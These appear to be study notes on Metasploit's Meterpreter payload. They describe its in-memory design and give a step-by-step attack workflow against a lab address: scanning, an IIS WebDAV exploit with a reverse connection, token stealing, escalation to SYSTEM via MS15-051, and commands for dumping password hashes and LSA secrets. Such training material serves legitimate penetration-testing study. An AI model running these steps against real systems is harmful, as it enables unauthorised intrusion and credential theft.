# Summary: Meterpreter Payloads, Execution, and Post-Exploitation

## 🎯 Overview of Meterpreter
- **What is it?** A multi-faceted, extensible, memory-resident payload that utilizes DLL injection (via a Reflective stub) for high stability.
- **Key Characteristics:** Resides entirely in memory (leaving no disk footprint), communicates via AES-encrypted channels, and supports dynamic extension loading (`stdapi`, `priv`, etc.).
- **Core Design Goals:** **Stealthy** (in-memory, process migration, AES encryption), **Powerful** (channelized communication, rich built-in toolset), and **Extensible** (runtime module loading).

---

## 🚀 Execution & Initialization Flow
1. Target executes the initial stager (bind, reverse, etc.).
2. The stager loads the reflectively injected DLL.
3. Meterpreter core initializes, establishes an AES-encrypted link over the socket, and sends an initial `GET` request.
4. Extensions (`stdapi`, `priv`) are loaded dynamically over encrypted channels.

---

## 🛠️ Practical Attack Workflow Example
1. **Target Discovery & Scanning:**
   ```text
   msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15
   ```

2. **Exploiting a Vulnerability (e.g., IIS WebDAV CVE-2017-7269):**
    
    Plaintext
    
    ```
    msf6 > use exploit/windows/iis/iis_webdav_upload_asp
    msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15
    msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0
    msf6 exploit(windows/iis/iis_webdav_upload_asp) > run
    ```
    
3. **Process Migration & Token Stealing:**
    
    Plaintext
    
    ```
    meterpreter > getuid
    meterpreter > ps
    meterpreter > steal_token <PID>
    ```
    
4. **Local Privilege Escalation via Suggester:**
    
    Plaintext
    
    ```
    meterpreter > bg
    msf6 > use post/multi/recon/local_exploit_suggester
    msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
    msf6 post(multi/recon/local_exploit_suggester) > run
    ```
    
5. **Executing the Local Exploit (e.g., MS15-051):**
    
    Plaintext
    
    ```
    msf6 > use exploit/windows/local/ms15_051_client_copy_image
    msf6 exploit(...) > set session 1
    msf6 exploit(...) > set LHOST tun0
    msf6 exploit(...) > run
    meterpreter > getuid
    # Server username: NT AUTHORITY\SYSTEM
    ```
    

## 📋 Essential Meterpreter Commands Reference

|**Command**|**Description**|
|---|---|
|**`help` / `?`**|Displays the interactive Meterpreter help menu.|
|**`background` / `bg`**|Backgrounds the current active Meterpreter session.|
|**`sessions`**|Quickly lists and switches between active sessions.|
|**`getuid`**|Displays the username the current process is running under.|
|**`ps`**|Lists all currently running system processes.|
|**`steal_token <PID>`**|Impersonates the security token of a specified running process.|
|**`migrate <PID>`**|Migrates the Meterpreter server payload into another process.|
|**`hashdump`**|Extracts local password hashes (LM/NTLM) from the SAM database.|
|**`lsa_dump_sam`**|Dumps detailed SAM database entries and keys as SYSTEM.|
|**`lsa_dump_secrets`**|Dumps LSA secrets, cached credentials, and system policy data.|
|**`irb`**|Opens an interactive Ruby shell bound to the current session.|
|**`shell`**|Spawns a native host-OS command shell via an encrypted channel.|
